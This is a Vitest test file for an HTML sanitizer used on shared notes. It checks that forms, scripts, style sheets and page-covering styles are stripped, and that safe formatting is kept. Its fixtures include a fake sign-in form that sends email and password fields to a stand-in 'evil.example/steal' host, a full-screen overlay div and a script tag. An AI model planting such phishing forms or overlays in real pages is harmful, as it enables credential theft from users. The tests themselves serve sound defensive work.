import { describe, expect, it } from "vitest";
import { sanitizeSharedNoteHtml } from "../shared-note-html";

function parse(html: string) {
  const div = document.createElement("div");
  div.innerHTML = sanitizeSharedNoteHtml(html);
  return div;
}

describe("sanitizeSharedNoteHtml", () => {
  it("removes forms and text fields that could imitate a sign-in page", () => {
    const out = parse(
      '<p>Hi</p><form action="https://evil.example/steal"><input type="email" name="email"><input type="password" name="pw"><textarea></textarea><button type="submit">Sign in</button></form>',
    );
    expect(out.querySelector("form, button, textarea, input[type=password], input[type=email]")).toBeNull();
    expect(out.innerHTML).not.toContain("evil.example");
    expect(out.textContent).toContain("Hi");
  });

  it("keeps a task list's checkbox, read-only", () => {
    const out = parse('<ul data-type="taskList"><li><label><input type="checkbox" checked></label><div><p>Done</p></div></li></ul>');
    const box = out.querySelector("input");
    expect(box?.getAttribute("type")).toBe("checkbox");
    expect(box?.hasAttribute("disabled")).toBe(true);
  });

  it("keeps the editor's colours and alignment but drops styling that can cover the page", () => {
    const out = parse(
      '<p style="text-align: center">c</p><span style="color: hsl(0, 72%, 51%)">red</span><div style="position:fixed;inset:0;z-index:9999;background:url(https://evil.example/x.png)">x</div>',
    );
    expect(out.querySelector("p")?.getAttribute("style")).toBe("text-align: center");
    expect(out.querySelector("span")?.getAttribute("style")).toBe("color: hsl(0, 72%, 51%)");
    expect(out.querySelector("div")?.hasAttribute("style")).toBe(false);
  });

  it("drops style sheets and script", () => {
    const out = parse("<style>body{display:none}</style><script>alert(1)</script><p>ok</p>");
    expect(out.querySelector("style, script")).toBeNull();
    expect(out.textContent).toBe("ok");
  });
});
